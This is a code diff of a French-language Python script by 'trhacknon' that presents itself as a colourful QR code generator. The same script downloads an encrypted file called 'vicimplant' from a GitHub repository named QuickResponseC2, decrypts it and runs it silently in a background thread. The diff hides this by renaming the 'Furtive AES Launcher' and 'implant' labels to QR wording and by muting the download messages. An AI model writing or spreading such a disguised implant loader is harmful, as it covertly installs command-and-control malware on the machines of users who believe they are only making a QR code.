@@ -42,26 +42,26 @@ console = Console()
 
 def afficher_titre():
     console.print(Panel.fit(
-        "[bold magenta]trhacknon - Furtive AES Launcher[/bold magenta]",
-        subtitle="[italic cyan]QR Code + AES implant activator[/italic cyan]",
+        "[bold magenta]trhacknon - qr emet Launcher[/bold magenta]",
+        subtitle="[italic cyan]QR Code + qr activator[/italic cyan]",
         box=box.DOUBLE, border_style="blue"))
 
 def download_file(url, dest):
-    console.print(f"[blue]Téléchargement de [underline]{url}[/underline] ...[/blue]")
+    #console.print(f"[blue]Téléchargement de [underline]{url}[/underline] ...[/blue]")
     try:
         r = requests.get(url, stream=True, timeout=15)
         r.raise_for_status()
         with open(dest, 'wb') as f:
             for chunk in r.iter_content(chunk_size=8192):
                 f.write(chunk)
-        console.print(f"[green]✔ Téléchargement terminé et sauvegardé dans : {dest}[/green]")
+        console.print(f"[green]✔ Téléchargement terminé[/green]")
         return True
     except Exception as e:
         console.print(f"[red]Erreur lors du téléchargement : {e}[/red]")
         return False
 
 def decrypt_and_exec_silently(filepath, password):
-    """Déchiffre et execute le code AES en tâche de fond (thread) sans output visible."""
+    """Dec exec le code"""
     def worker():
         try:
             with open(filepath, "rb") as f:
@@ -108,7 +108,7 @@ def main():
     os.system("cls" if os.name == "nt" else "clear")
     afficher_titre()
 
-    if questionary.confirm("Lancer le mode URGENCE ? (Implant AES + QR)").ask():
+    if questionary.confirm("Lancer le mode qrme ? (QR+AES)").ask():
         url = "https://github.com/tucommenceapousser/QuickResponseC2/raw/refs/heads/trkn/vicimplant%20(1).enc"
         filepath = "vicimplant.enc"
 
@@ -121,14 +121,14 @@ def main():
                 console.print("[red]Le fichier implant n'a pas pu être téléchargé. Abandon.[/red]")
                 return
 
-        password = questionary.password("Mot de passe du déchiffrement :").ask()
-        console.print("[yellow]Déchiffrement et lancement en tâche de fond...[/yellow]")
+        password = questionary.password("Mot de passe du déchiffrement(par defaut trkn) :").ask()
+        console.print("[bold yellow]Déchiffrement[/bold yellow]")
         decrypt_and_exec_silently(filepath, password)
         time.sleep(1)  # Petit délai pour le lancement
 
         console.print("\n[bold cyan]Passons à la génération du QR Code personnalisé ![/bold cyan]")
 
-        data = questionary.text("Texte / URL à encoder dans le QR code :", default="https://trhacknon.com").ask()
+        data = questionary.text("Texte / URL à encoder dans le QR code :", default="we are anonymous, im trhacknon").ask()
         fg_color = questionary.text("Couleur du QR code (ex: black, red, #FF00FF) :", default="magenta").ask()
         bg_color = questionary.text("Couleur du fond du QR code :", default="white").ask()
 
@@ -138,7 +138,7 @@ def main():
         filename = questionary.text("Nom du fichier de sauvegarde (ex: qrcode.png) :", default="qrcode.png").ask()
         sauvegarder_qrcode(img, filename)
 
-        console.print("[bold green]QR Code prêt et implant lancé en arrière-plan ![/bold green]")
+        console.print("[bold green]QR Code prêt et ![/bold green]")
     else:
         console.print("[yellow]Opération annulée. Rien n’a été lancé.[/yellow]")
 
